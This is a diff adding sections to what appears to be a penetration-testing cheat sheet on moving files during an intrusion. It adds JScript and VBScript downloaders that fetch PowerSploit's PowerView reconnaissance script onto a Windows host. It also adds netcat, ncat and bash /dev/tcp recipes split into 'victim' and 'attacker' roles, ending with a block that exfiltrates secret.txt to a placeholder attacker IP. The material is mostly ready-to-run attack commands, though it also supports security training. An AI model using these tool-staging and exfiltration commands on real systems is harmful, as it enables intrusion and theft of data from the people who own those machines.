@@ -305,6 +305,124 @@ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser
 
 ## JavaScript
 
+### Download
+
 ```javascript
-# create 
+// create wget.js
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+WinHttpReq.Send();
+BinStream = new ActiveXObject("ADODB.Stream");
+BinStream.Type = 1;
+BinStream.Open();
+BinStream.Write(WinHttpReq.ResponseBody);
+BinStream.SaveToFile(WScript.Arguments(1));
+
+// download using the script
+cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
+```
+
+## VBScript
+
+### Download
+
+```bash
+# create wget.vbs
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", WScript.Arguments.Item(0), False
+xHttp.Send
+
+with bStrm
+    .type = 1
+    .open
+    .write xHttp.responseBody
+    .savetofile WScript.Arguments.Item(1), 2
+end with
+
+# download using the script
+cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
+```
+
+# Netcat
+
+# Netcat / Ncat File Transfer
+
+## 1. Victim Listens → Attacker Sends
+> Use when inbound connections to the victim are allowed.
+
+### Victim (Original Netcat)
+```bash
+nc -l -p 8000 > file
+```
+
+### Victim (Ncat)
+```bash
+ncat -l -p 8000 --recv-only > file
+```
+
+### Attacker (Original Netcat)
+```bash
+nc -q 0 <victim-ip> 8000 < file
+```
+
+### Attacker (Ncat)
+```bash
+ncat --send-only <victim-ip> 8000 < file
+```
+
+---
+
+## 2. Attacker Listens → Victim Downloads
+> Use when victim cannot receive inbound connections (firewall/NAT).
+
+### Attacker (Original Netcat)
+```bash
+sudo nc -l -p 443 -q 0 < file
+```
+
+### Attacker (Ncat)
+```bash
+sudo ncat -l -p 443 --send-only < file
+```
+
+### Victim (Original Netcat)
+```bash
+nc <attacker-ip> 443 > file
+```
+
+### Victim (Ncat)
+```bash
+ncat <attacker-ip> 443 --recv-only > file
+```
+
+---
+
+## 3. No Netcat on Victim (`/dev/tcp`)
+> Bash-only feature.
+
+### Attacker
+```bash
+sudo nc -l -p 443 -q 0 < file
+# or
+sudo ncat -l -p 443 --send-only < file
+```
+
+### Victim
+```bash
+cat < /dev/tcp/<attacker-ip>/443 > file
+```
+
+---
+
+## 4. Exfiltrate Files (Victim → Attacker)
+
+### Attacker
+```bash
+nc -l -p 443 > secret.txt
+```
+
+### Victim
+```bash
+nc <attacker-ip> 443 < secret.txt
 ```
